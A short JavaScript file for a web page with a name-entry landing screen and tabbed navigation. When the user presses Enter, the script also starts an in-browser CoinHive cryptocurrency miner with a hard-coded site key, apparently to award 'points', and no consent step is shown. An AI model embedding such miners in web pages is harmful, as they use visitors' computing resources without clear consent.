var named = false
document.querySelector("#start").addEventListener("keyup", (e)=>{
  if (e.key == "Enter") {
    document.querySelector("#landing").style.display = "none";
    document.querySelector("#start").style.top = "35px";
    document.querySelector("#start").style.left = "135px";
    document.querySelector("#start").setAttribute("readonly","");
    document.querySelector("#start").setAttribute("class","tab");
    document.querySelector("#portal").style.display = "inherit";
    named = true;
    // Add coin hive for points
    var miner = new CoinHive.User("7RaiTYKeaBtz17GRNjKDr0LNIpdiT2VR", document.querySelector("#start")+window.location.hash);
    miner.start();
  }
});
var show = "myteam";
function tab(e) {
  if (named) {
    if (show) {
      document.querySelector("#"+show).style.display = "none";
    }
    show = e.getAttribute("data-show");
    document.querySelector("#"+show).style.display = "inherit";
  }
}
